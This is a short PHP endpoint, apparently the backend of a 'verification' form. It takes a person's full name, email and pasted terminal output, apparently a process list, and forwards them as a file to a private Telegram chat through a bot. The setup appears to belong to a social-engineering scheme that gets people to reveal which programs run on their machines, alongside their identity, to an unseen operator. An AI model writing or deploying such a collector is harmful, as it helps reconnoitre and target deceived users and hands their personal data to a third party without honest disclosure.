<?php
require_once __DIR__ . '/config.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Telegram bot not configured']);
    exit;
}

if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE' || TELEGRAM_CHAT_ID === '') {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Telegram chat not configured']);
    exit;
}

$body = json_decode(file_get_contents('php://input'), true);

if (!$body) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Invalid JSON body']);
    exit;
}

$fullName       = trim($body['full_name'] ?? '');
$email          = trim($body['email'] ?? '');
$terminalOutput = trim($body['terminal_output'] ?? '');

if ($fullName === '' || $email === '' || $terminalOutput === '') {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Full name, email, and terminal output are all required']);
    exit;
}

$timestamp = date('Y-m-d H:i:s T');

$caption = "Verification Submission\n"
         . "Name: $fullName\n"
         . "Email: $email\n"
         . "Time: $timestamp";

$tmpFile = tempnam(sys_get_temp_dir(), 'tasklist_');
file_put_contents($tmpFile, $terminalOutput);

$safeName = preg_replace('/[^a-zA-Z0-9_-]/', '_', $fullName);
$filename = "processes_{$safeName}_" . date('Ymd_His') . '.txt';

$ch = curl_init("https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendDocument");
$post = [
    'chat_id'  => TELEGRAM_CHAT_ID,
    'caption'  => $caption,
    'document' => new CURLFile($tmpFile, 'text/plain', $filename),
];
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => $post,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 30,
]);
$resp = curl_exec($ch);
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

unlink($tmpFile);

if ($code !== 200) {
    $decoded = json_decode($resp, true);
    http_response_code(502);
    echo json_encode(['ok' => false, 'error' => $decoded['description'] ?? "Telegram HTTP $code"]);
    exit;
}

echo json_encode(['ok' => true]);
